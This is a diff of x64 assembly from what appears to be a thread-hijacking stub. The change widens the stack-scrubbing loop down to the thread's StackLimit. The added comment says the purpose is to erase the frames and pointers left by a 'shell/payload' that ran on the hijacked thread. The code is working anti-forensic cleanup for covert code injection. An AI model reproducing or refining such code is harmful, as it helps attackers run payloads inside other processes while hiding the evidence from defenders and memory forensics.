@@ -125,43 +125,28 @@ ELSE
     fxrstor [r10]
 ENDIF
     StubFpRestoreDone:
+    ; Scrub every dead stack slot the hijack touched, from the saved RSP down to
+    ; the thread's current stack limit. The stub's own frame ends only 0x48 below
+    ; r12, but the shell/payload ran far deeper on this same stack, so the floor
+    ; has to be StackLimit (TEB::StackLimit, gs:[0x10]) - a fixed r12-relative
+    ; floor leaves the shell's frames, and the pointers into the payload they
+    ; hold, in place. StackLimit is the lowest committed page, so the walk never
+    ; reaches the guard page. rdi/r10/rdx/r8 are all restored by the pops below.
     lea rdi, [r12]
-    mov rax, rdi
-    sub rax, 80h
-    and rax, 0FFFFFFFFFFFFFFF0h
-    sub rax, 40h
     mov r10, gs:[10h]
     cmp r10, rdi
     jae StubStackScrubDone
-    cmp r10, rax
-    jae StubStackScrubSkipLow
-    cmp rax, rdi
-    jae StubStackScrubDone
-    mov rdx, rdi
-    sub rdx, rax
-    shr rdx, 3
-    xor r8d, r8d
-StubStackScrubLoop:
-    test rdx, rdx
-    jz StubStackScrubTail
-    mov qword ptr [rdi-8], r8
-    sub rdi, 8
-    dec rdx
-    jmp StubStackScrubLoop
-StubStackScrubTail:
-    jmp StubStackScrubDone
-StubStackScrubSkipLow:
     mov rdx, rdi
     sub rdx, r10
     shr rdx, 3
     xor r8d, r8d
-StubStackScrubLoopLow:
+StubStackScrubLoop:
     test rdx, rdx
     jz StubStackScrubDone
     mov qword ptr [rdi-8], r8
     sub rdi, 8
     dec rdx
-    jmp StubStackScrubLoopLow
+    jmp StubStackScrubLoop
 StubStackScrubDone:
     mov rsp, r12
     pop r15
